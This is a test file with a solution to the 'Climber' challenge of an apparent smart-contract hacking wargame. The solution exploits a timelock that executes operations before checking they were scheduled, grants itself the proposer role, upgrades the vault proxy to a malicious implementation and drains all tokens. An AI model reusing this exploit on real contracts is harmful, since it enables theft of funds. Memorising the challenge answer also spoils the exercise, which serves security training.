const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, player;
  let timelock, vault, token;

  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TIMELOCK_DELAY = 60 * 60;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await vault.getSweeper()).to.eq(sweeper.address);
    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await vault.owner();
    timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock delay is correct and cannot be changed
    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
    await expect(
      timelock.updateDelay(TIMELOCK_DELAY + 1)
    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

    // Ensure timelock roles are correctly initialized
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /**Attack starts by running execute function on timeLock contract to
     * (1) reset the delay time,
     * (2) call grantRole on itself to give proposer role to climberAttack contract
     * (3) climberAttack contract call back the schedule function and approve the operation.
     * */

    /** FakeVault contract is the malicious implementation contract that replaces the initial implementation to
     * allow player to drain funds through compromised sweep funds function
     */

    //Deploy climberAttack and FakeVault
    let values = [0, 0, 0];
    let salt = ethers.utils.id("climber");
    const ClimberAttack = await ethers.getContractFactory("ClimberAttack");
    const climberAttack = await ClimberAttack.deploy(
      timelock.address,
      values,
      salt
    );
    console.log(climberAttack.address);
    const FakeVault = await ethers.getContractFactory("FakeVault");
    const fakeVault = await FakeVault.deploy(player.address);
    console.log(fakeVault.address);

    //Prepare calldata to pass to schedule function on timeLock
    let dataElements = [];

    let abi1 = [`function updateDelay(uint64 newDelay)`];
    let iface1 = new ethers.utils.Interface(abi1);
    let data1 = iface1.encodeFunctionData("updateDelay", [0]);
    dataElements.push(data1);
    let abi2 = [`function grantRole(bytes32 role, address account)`];
    let iface2 = new ethers.utils.Interface(abi2);
    let data2 = iface2.encodeFunctionData("grantRole", [
      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
      climberAttack.address,
    ]);
    dataElements.push(data2);
    let abi3 = [`function hackSchedule()`];
    let iface3 = new ethers.utils.Interface(abi3);
    let data3 = iface3.encodeFunctionData("hackSchedule", []);
    dataElements.push(data3);
    console.log(dataElements);
    await climberAttack.addData(dataElements);
    //Call execute function on timeLock to run prepared calldata
    //Ensure climberAttack contract is granted propser role
    await timelock.execute(
      [timelock.address, timelock.address, climberAttack.address],
      values,
      dataElements,
      salt
    );
    await climberAttack.checkRole();
    let hasRole = await climberAttack.hasRole();
    console.log(hasRole);

    //Upgrade vault proxy to malicous implementation fakeVault
    abi1 = ["function upgradeTo(address newImplementation)"];
    iface1 = new ethers.utils.Interface(abi1);
    data1 = iface1.encodeFunctionData("upgradeTo", [fakeVault.address]);
    await climberAttack.schedule([vault.address], [0], [data1], salt);
    await timelock.execute([vault.address], [0], [data1], salt);
    await vault.connect(player).sweepFunds(token.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
